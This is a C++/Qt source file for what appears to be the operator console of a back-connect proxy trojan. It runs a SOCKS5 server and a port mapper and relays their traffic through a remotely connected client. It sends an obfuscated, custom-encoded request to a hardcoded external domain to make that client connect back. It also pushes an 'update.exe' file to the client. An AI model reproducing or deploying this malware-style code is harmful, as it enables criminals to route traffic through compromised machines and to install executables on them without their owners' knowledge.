#include "controller.h"
#include "ui_controller.h"
#include "enc.h"

controller::controller(QWidget *parent)
    : QMainWindow(parent), ui(new Ui::controller)
{
    ui->setupUi(this);

    QtWin::enableBlurBehindWindow(this, true);

    sckController = new QTcpServer(this);
    connect(sckController, SIGNAL(newConnection()),
            this, SLOT(sckController_newConnection()));

    sckSocks5 = new QTcpServer(this);
    connect(sckSocks5, SIGNAL(newConnection()),
            this, SLOT(sckSocks_newConnection()));

    on_pusControllerPort_clicked();
    on_pushSocksPort_clicked();

    lstSlotsFree.fill(false,128);
    lstSlots.resize(128);

    isConnected = false;
    on_pusControllerPort_clicked();

    downloader = new QNetworkAccessManager(this);
    connect(downloader, SIGNAL(finished(QNetworkReply*)),
            this, SLOT(downloadMyIp(QNetworkReply*)));
    QNetworkRequest request;
    request.setUrl(QUrl("http://whatismyip.akamai.com/"));
    request.setRawHeader("User-Agent",
            "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)");
    downloader->get(request);

}

controller::~controller()
{
    delete ui;
}

void controller::on_pusControllerPort_clicked()
{
    sckController->close();
    sckController->listen(
            QHostAddress::Any,
            ui->txtControllerPort->text().toInt()
    );
}


void controller::on_pushSocksPort_clicked()
{
    sckSocks5->close();
    sckSocks5->listen(
            //QHostAddress::LocalHost,
            QHostAddress::Any,
            ui->txtSocksPort->text().toInt()
    );
}

void controller::sckController_newConnection()
{
    if (!sckController->hasPendingConnections()) return;
    QTcpSocket *socketNew = sckController->nextPendingConnection();
    if (socketNew->peerAddress().isNull())
    {
        socketNew->abort();
        socketNew->deleteLater();
        return;
    }

    barData.clear();
    rstinseq();

    isConnected = true;
    sckController->close();
    ui->commandLinkButton_2->setEnabled(true);
    ui->cmdUpdate->setEnabled(true);
    ui->chkClient->setChecked(true);
    ui->chkClient->setText("Client "+socketNew->peerAddress().toString()
                           +":"+QString::number(socketNew->peerPort()));

    connect(socketNew, SIGNAL(readyRead()),
            this, SLOT(sckController_readyRead()));
    connect(socketNew, SIGNAL(disconnected()),
            this, SLOT(sckController_disconnect()));
    connect(socketNew, SIGNAL(error(QAbstractSocket::SocketError)),
            this, SLOT(sckController_disconnect()));

    log_add("Connected client "
                        +socketNew->peerAddress().toString());
}

void controller::sckController_readyRead()
{
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    if (!socket->bytesAvailable()) { return; }
    barData.append(socket->readAll());
    if (!socket->property("x-77-message").isValid()) {
        socket->setProperty("x-77-message", true);
        qint32 length = 0;
        if (barData.at(0) == '\xc8') {
            senc(barData, 0);
            length = barData.indexOf('\n');
            senc(barData, length);
        }
        if (length > 0) {
            ui->chkClient->setText("Client " + barData.mid(1, length - 1));
            log_add("Proxy for " + barData.mid(1, length - 1));
            barData = barData.mid(length + 1);
        }
    }
    bool ok = true;
    QByteArray barRet;
    quint8 slot;
    ok = dcdata(barData, barRet, slot);
    while (ok)
    {
        if (slot == 1) {
            slot = barRet.at(1);
            if (lstSlots.at(slot) == 0) continue;
            QByteArray data;
            quint16 port;
            switch (barRet.at(0))
            {
                case 2: //connected
                    if (lstSlots[slot]->property("x-request").toInt() == 2) {
                        data = QByteArray::fromHex("05000001");
                        data.append(barRet.mid(2));
                        data.append(data.right(2).at(0));
                        data.remove(data.size()-3,1);
                        lstSlots[slot]->write(data);
                        lstSlots[slot]->setProperty("x-request", 3);
                    }
                    log_add("Connected "+QString::number(slot));
                    if (lstSlots[slot]->property("x-precon-buffer").isValid()) {
                        data = lstSlots[slot]->
                               property("x-precon-buffer").toByteArray();
                        if (!data.isEmpty()) {
                            lstSlots[slot]->setProperty("x-precon-buffer", 0);
                            data = mkdata(data, slot);
                            socket->write(data);
                        }
                    }
                    break;
                case 3: //error
                    quint16 err;
                    if (barRet.size() > 2) {
                        err = barRet.at(2);
                        data = "\5";
                        data.reserve(11);
                        switch (err)
                        {
                            case QAbstractSocket::ConnectionRefusedError:
                                data.append('\5');
                                break;
                            case QAbstractSocket::HostNotFoundError:
                                data.append('\4');
                                break;
                            case QAbstractSocket::NetworkError:
                                data.append('\3');
                                break;
                            default:
                                data.append('\1');
                        }
                        data.append('\0');
                        data.append(lstSlots.at(slot)
                                    ->property("type").toChar());
                        if (3 == lstSlots.at(slot)
                            ->property("type").toInt())
                        {
                            data.append(lstSlots.at(slot)
                                    ->property("dest").toByteArray().size());
                        }
                        data.append(lstSlots.at(slot)
                                    ->property("dest").toByteArray());
                        port = lstSlots.at(slot)->property("port").toInt();
                        data.append(QByteArray::fromRawData((char*)&port,2));
                        data.append(data.right(2).at(0));
                        data.remove(data.size()-3,1);
                        lstSlots[slot]->write(data);
                    }
                    lstSlots[slot]->disconnectFromHost();
                    log_add("Error "+QString::number(slot));
                    break;
                case 4: //disconnected
                case 5: //no slot
                    lstSlots[slot]->disconnectFromHost();
                    log_add("Disconnected "+QString::number(slot));
                    break;
            }
        } else {
            if (lstSlotsFree.at(slot) && lstSlots.at(slot)->isValid()) {
                lstSlots[slot]->write(barRet);
            }
        }
        ok = dcdata(barData, barRet, slot);
    }
}

void controller::sckController_disconnect()
{
    if (!isConnected) return;
    isConnected = false;
    on_pusControllerPort_clicked();
    ui->chkClient->setChecked(false);
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    socket->abort();
    socket->deleteLater();
    for (quint8 i = 2; i < 128; ++i) {
        lstSlotsFree[i] = false;
        if (lstSlots[i]) {
            if (lstSlots[i]->state() == QAbstractSocket::UnconnectedState) {
                lstSlots[i]->deleteLater();
                lstSlots[i] = NULL;
            } else {
                lstSlots[i]->disconnectFromHost();
            }
        }
    }
    log_add("Controller disconnected");
    ui->commandLinkButton_2->setEnabled(false);
    ui->cmdUpdate->setEnabled(false);
}

quint8 controller::findFreeSlot()
{
    if (!intLastFree) intLastFree = 2;
    quint8 slot = lstSlotsFree.indexOf(false, intLastFree);
    if (slot < 2 || slot > 127) {
        intLastFree = 2;
        return lstSlotsFree.indexOf(false, intLastFree);
    } else {
        intLastFree = slot + 1;
        return slot;
    }
}

void controller::sckSocks_newConnection()
{
    if (!sckSocks5->hasPendingConnections()) return;
    QTcpSocket *socketNew = sckSocks5->nextPendingConnection();
    quint8 intSlot = findFreeSlot();
    if (socketNew->peerAddress().isNull() || intSlot == 255)
    {
        socketNew->abort();
        socketNew->deleteLater();
        return;
    }
    socketNew->setProperty("x-request",0);
    socketNew->setProperty("slot", intSlot);
    lstSlotsFree[intSlot] = true;
    lstSlots[intSlot] = socketNew;

    connect(socketNew, SIGNAL(disconnected()),
            this, SLOT(sckSocks_disconnect()));
    connect(socketNew, SIGNAL(error(QAbstractSocket::SocketError)),
            this, SLOT(sckSocks_disconnect()));
    connect(socketNew, SIGNAL(readyRead()),
            this, SLOT(sckSocks_readyRead()));
}

void controller::sckSocks_disconnect()
{
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    quint8 intSlot = socket->property("slot").toInt();
    if (!lstSlotsFree[intSlot]) return;
    lstSlotsFree[intSlot] = false;
    lstSlots[intSlot] = NULL;
    QByteArray data = "\2";
    data.append(intSlot);
    data = mkdata(data, 1);
    QList<QTcpSocket *> sarClients
            = sckController->findChildren<QTcpSocket *>();
    foreach (QTcpSocket *socketClient, sarClients) {
        socketClient->write(data);
    }
    socket->deleteLater();
    log_add("Disconnected "+QString::number(intSlot));
}

bool controller::socketDataComplete(quint16 minSize, QTcpSocket *&socket)
{
    if (socket->bytesAvailable() < minSize) {
//        QByteArray data = socket->property("x-cache").toByteArray();
//        data.append(socket->readAll());
//        socket->setProperty("x-cache", data);
        socket->disconnectFromHost();
        return true;
    }
    return false;
}

void controller::sckSocks_readyRead()
{
    QTcpSocket *socket = static_cast<QTcpSocket*>(sender());
    QByteArray data;
    QList<QTcpSocket *> sarClients;
    QByteArray barPort;
    QByteArray dest;
    QHostAddress ipv4;
    quint32 i;
    quint16 port;
    quint8 type;

    while (socket->bytesAvailable()) {
        switch (socket->property("x-request").toInt())
        {
            case 0:
                if (socketDataComplete(2, socket)) { return; }
                data = socket->read(2);
                if (data.at(0) != 0x05) {
                    return socket->disconnectFromHost();
                }
                if (socketDataComplete((int)data.at(1),socket)) { return; }
                data = socket->read((int)data.at(1));
                if (-1 == data.indexOf('\0', 0)) {
                    data = QByteArray::fromHex("05FF");
                    socket->write(data);
                    return socket->disconnectFromHost();
                }
                data = QByteArray::fromHex("0500");
                socket->write(data);
                socket->setProperty("x-request", 1);
                break;
            case 1:
                if (socketDataComplete(8,socket)) { return; }
                data = socket->read(4);
                if (data.indexOf(QByteArray::fromHex("050100"), 0) != 0) {
                    return socket->disconnectFromHost();
                }
                type = data.at(3);
                data = "\1";
                data.append(socket->property("slot").toChar());
                data.append(type);
                switch (type)
                {
                    case 1: //0x01 = IPv4 address
                        dest = socket->read(4);
                        break;
                    case 3: //0x03 = Domain name
                        data.append(socket->read(1));
                        dest = socket->read(data.at(3));
                        break;
                    case 4: //0x04 = IPv6 address
                        dest = socket->read(16);
                        break;
                }
                data.append(dest);
                if (socketDataComplete(2,socket)) { return; }
                barPort = socket->read(2);
                barPort.append(barPort.at(0));
                barPort = barPort.right(2);
                port = (* (quint16*)barPort.data() );
                data.append(QByteArray::fromRawData((char*)&port,2));
                if (!isConnected) {
                    data = QByteArray::fromHex("050300");
                    data.append((char)type);
                    data.append(dest);
                    data.append(barPort);
                    socket->write(data);
                    socket->disconnectFromHost();
                    return;
                }
                if (type == 1) {
                    i = (* (quint32*)dest.data() );
                    i = (i>>24) |
                        ((i<<8) & 0x00FF0000) |
                        ((i>>8) & 0x0000FF00) |
                        (i<<24);
                    ipv4.setAddress(i);
                    dest = ipv4.toString().toAscii();
                }
                log_add("Connecting to "+dest+" "
                  +QString::number(port)+" slot "
                  +QString::number(socket->property("slot").toInt())+" ...");
                data = mkdata(data, 1);
                sarClients = sckController->findChildren<QTcpSocket *>();
                foreach (QTcpSocket *socketClient, sarClients) {
                    socketClient->write(data);
                }
                socket->setProperty("type",type);
                socket->setProperty("dest",dest);
                socket->setProperty("port",port);
                socket->setProperty("x-request", 2);
                barPort.clear();
                break;
            case 2:
            case 4:
                if (!socket->property("x-precon-buffer").isValid()) {
                    data = "";
                } else {
                    data = socket->property("x-precon-buffer").toByteArray();
                }
                data.append(socket->readAll());
                socket->setProperty("x-precon-buffer", data);
                break;
            case 3:
                data = socket->readAll();
                data = mkdata(data, socket->property("slot").toInt());
                sarClients = sckController->findChildren<QTcpSocket *>();
                foreach (QTcpSocket *socketClient, sarClients) {
                    socketClient->write(data);
                }
                break;
        }
    }
}

void controller::log_add(QString entry)
{
    ui->lstLog->addItem(entry);
    if (ui->lstLog->count() > 200) {
        for (quint16 i = 0; i < 100; ++i) {
            delete ui->lstLog->takeItem(0);
        }
    }
    ui->lstLog->scrollToBottom();
}

void controller::downloadMyIp(QNetworkReply* reply)
{
    barMyIP = reply->readAll();
    log_add("Public ip: "+barMyIP);
    disconnect(downloader, SIGNAL(finished(QNetworkReply*)),
               this, SLOT(downloadMyIp(QNetworkReply*)));
    connect(downloader, SIGNAL(finished(QNetworkReply*)),
            this, SLOT(downloadReqCon(QNetworkReply*)));
    ui->commandLinkButton->setEnabled(true);
}

void controller::downloadNext()
{
    QNetworkRequest request;
    QUrl req("https://bitspeercachedetect.com/cgi-bin/p");
#ifdef _DEBUG
    req.setScheme("http");
#endif
    quint16 port = ui->txtControllerPort->text().toInt();
    QByteArray query("\1");
    query.append(QByteArray::fromRawData((char*)&port, 2));
    query.append(barMyIP);
    senc(query,0);
    query.prepend(QByteArray::fromHex("C6127D4898"));
    senc(query,5);
    req.setEncodedQuery(query.toPercentEncoding().prepend("a="));
    request.setUrl(req);
    QByteArray u1, u2;
    u1 = QByteArray::fromHex("A251280A8E8F9E41210E");
    senc(u1,0);
    u2 = QByteArray::fromHex("BA4D3711CFA2980B7A5495F0D3713812C3BD8A5B6"
                             "85EFCEFDF6706C9EEF6360267B98D8F6A403DEBD8"
                             "A9257E0FA687F237097DEDDDF35C6776");
    senc(u2,0);
    request.setRawHeader(u1, u2);
    downloader->get(request);
}

void controller::downloadReqCon(QNetworkReply* reply)
{
    QByteArray data = QByteArray::fromBase64(reply->readAll());
    if (data.isEmpty()) {
        data.append('\0');
    }
    switch (data.at(0)) {
    case 7:
    case 8:
        log_add("Requested connection to "+barMyIP);
        break;
    default:
        log_add("Proxy failed to respond correctly :(");
    }
}

void controller::on_commandLinkButton_clicked()
{
    downloadNext();
}

void controller::on_commandLinkButton_2_clicked()
{
    QList<QTcpSocket *> sarClients
            = sckController->findChildren<QTcpSocket *>();
    foreach (QTcpSocket *socketClient, sarClients) {
        socketClient->disconnectFromHost();
    }
}

bool controller::portMapAdd(QHostAddress bindIp, quint16 bindPort,
                QHostAddress destIp, quint16 destPort)
{
    foreach (QTcpServer *server, lstPortMap)
    {
        if (server
            && server->serverAddress().toString() == bindIp.toString()
            && server->serverPort() == bindPort)
        {
            if (server->property("x-connect-addr").toString()
                == destIp.toString()
                && server->property("x-connect-port").toInt() == destPort)
            {
                return true;
            }
            server->close();
            lstPortMap.removeOne(server);
            server->deleteLater();
            break;
        }
    }

    QTcpServer *newServer = new QTcpServer(this);
    if (!newServer->listen(bindIp, bindPort)) {
        return false;
    }
    newServer->setProperty("x-connect-addr", destIp.toString());
    newServer->setProperty("x-connect-port", destPort);
    connect(newServer, SIGNAL(newConnection()),
            this, SLOT(sckMapping_newConnection()));
    lstPortMap.append(newServer);
    return true;
}

bool controller::portMapDel(QString bindIp, quint16 bindPort)
{
    foreach (QTcpServer *server, lstPortMap) {
        if (server
            && server->serverAddress().toString() == bindIp
            && server->serverPort() == bindPort) {
            server->close();
            lstPortMap.removeOne(server);
            server->deleteLater();
            return true;
        }
    }
    return false;
}

void controller::portClear()
{
    QTcpSocket *socket;
    foreach (QTcpServer *server, lstPortMap)
    {
        foreach(socket, server->findChildren<QTcpSocket *>())
        {
            socket->close();
        }
        server->close();
    }
    lstPortMap.clear();
}

void controller::portPopulate(QTableView *lstTable)
{
    QAbstractItemModel *model = lstTable->model();
    QModelIndex index;
    foreach (QTcpServer *server, lstPortMap)
    {
        if (!model->insertRow(model->rowCount(),QModelIndex())) return;
        index = model->index(model->rowCount()-1,0,QModelIndex());
        model->setData(index,server->serverAddress().toString(),
                       Qt::DisplayRole);
        index = model->index(model->rowCount()-1,1,QModelIndex());
        model->setData(index,QString::number(server->serverPort()),
                       Qt::DisplayRole);
        index = model->index(model->rowCount()-1,2,QModelIndex());
        model->setData(index,server->property("x-connect-addr").toString(),
                       Qt::DisplayRole);
        index = model->index(model->rowCount()-1,3,QModelIndex());
        model->setData(index,server->property("x-connect-port").toString(),
                       Qt::DisplayRole);
    }
}

void controller::on_cmdUpdate_clicked()
{
    QFile update("update.exe");
    if (!update.exists() || !update.open(QIODevice::ReadOnly)) return;
    QTcpSocket *toController = sckController->
                               findChildren<QTcpSocket *>().first();
    QByteArray data;
    data = "\4";
    data = mkdata(data,1);
    toController->write(data);
    while(!update.atEnd()) {
        data = "\5";
        data.append(update.read(1484));
        data = mkdata(data,1);
        toController->write(data);
    }
    data = "\6";
    data = mkdata(data,1);
    toController->write(data);
    update.close();
    update.deleteLater();
}

void controller::on_cmdPortMapper_clicked()
{
    portmapperDialog = new portmapper(this);
    portmapperDialog->show();
}

void controller::sckMapping_newConnection()
{
    QTcpServer *server = static_cast<QTcpServer*>(sender());
    if (!server->hasPendingConnections()) return;
    QTcpSocket *socketNew = server->nextPendingConnection();
    quint8 intSlot = findFreeSlot();
    if (!isConnected || socketNew->peerAddress().isNull() || intSlot == 255)
    {
        socketNew->abort();
        socketNew->deleteLater();
        return;
    }
    socketNew->setProperty("x-request",4);
    socketNew->setProperty("slot", intSlot);
    socketNew->setProperty("type",3);
    lstSlotsFree[intSlot] = true;
    lstSlots[intSlot] = socketNew;

    QByteArray data = "\1";
    data.append((char)intSlot);
    data.append(0x03);
    data.append((char)server->property("x-connect-addr").toString().length());
    data.append(server->property("x-connect-addr").toString().toAscii());
    quint16 port = server->property("x-connect-port").toInt();
    data.append(QByteArray::fromRawData((char*)&port,2));
    log_add("[MAP] Connecting to "
            +server->property("x-connect-addr").toString()+" "
            +QString::number(port)+" slot "
            +QString::number(intSlot)+" ...");
    data = mkdata(data, 1);
    foreach (QTcpSocket *socketClient,
             sckController->findChildren<QTcpSocket *>()) {
        socketClient->write(data);
    }
    socketNew->setProperty("dest",
                        server->property("x-connect-addr").toString());
    socketNew->setProperty("port",port);

    connect(socketNew, SIGNAL(disconnected()),
            this, SLOT(sckSocks_disconnect()));
    connect(socketNew, SIGNAL(error(QAbstractSocket::SocketError)),
            this, SLOT(sckSocks_disconnect()));
    connect(socketNew, SIGNAL(readyRead()),
            this, SLOT(sckSocks_readyRead()));
}
